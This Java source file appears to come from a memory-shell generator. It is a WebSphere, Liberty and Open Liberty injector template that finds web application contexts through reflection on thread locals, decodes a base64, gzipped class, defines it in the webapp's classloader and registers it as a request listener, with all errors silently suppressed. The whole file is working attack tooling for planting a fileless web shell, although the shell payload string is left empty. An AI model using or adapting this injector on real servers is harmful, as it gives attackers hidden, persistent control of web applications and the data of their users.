package org.leo.jmg.mem.injectortpl.websphere;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class WebSphereListenerInjector {

    private static String shellClassName;
    private static String shellClass;
    private static boolean ok = false;

    public WebSphereListenerInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            contexts = null;
        }
        if (contexts != null && !contexts.isEmpty()) {
            for (Object context : contexts) {
                try {
                    Object shell = getShell(context);
                    inject(context, shell);
                } catch (Throwable ignored) {
                }
            }
        }
        ok = true;
        shellClass = null;
        shellClassName = null;
    }

    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Object[] threadLocals = null;
        boolean raw = false;
        try {
            // WebSphere Liberty
            threadLocals = (Object[]) getFieldValue(Thread.currentThread(), "wsThreadLocals");
        } catch (NoSuchFieldException ignored) {
        }
        if (threadLocals == null) {
            // Open Liberty
            threadLocals = (Object[]) getFieldValue(getFieldValue(Thread.currentThread(), "threadLocals"), "table");
            raw = true;
        }
        for (Object threadLocal : threadLocals) {
            if (threadLocal == null) {
                continue;
            }
            Object value = threadLocal;
            if (raw) {
                value = getFieldValue(threadLocal, "value");
            }
            if (value == null) {
                continue;
            }
            // for websphere 7.x
            if (value.getClass().getName().endsWith("FastStack")) {
                Object[] stackList = (Object[]) getFieldValue(value, "stack");
                for (Object stack : stackList) {
                    try {
                        Object config = getFieldValue(stack, "config");
                        contexts.add(getFieldValue(getFieldValue(config, "context"), "context"));
                    } catch (Exception ignored) {
                    }
                }
            } else if (value.getClass().getName().endsWith("WebContainerRequestState")) {
                Object webApp = invokeMethod(getFieldValue(getFieldValue(value, "currentThreadsIExtendedRequest"), "_dispatchContext"), "getWebApp", null, null);
                contexts.add(getFieldValue(getFieldValue(webApp, "facade"), "context"));
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            return ((ClassLoader) getFieldValue(context, "loader"));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(shellClassName);
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        return clazz.newInstance();
    }

    @SuppressWarnings("unchecked")
    public void inject(Object context, Object listener) throws Exception {
        List<Object> listeners = (List<Object>) getFieldValue(context, "servletRequestListeners");
        for (Object o : listeners) {
            if (o.getClass().getName().equals(shellClassName)) {
                return;
            }
        }
        listeners.add(listener);
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws
            Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

}
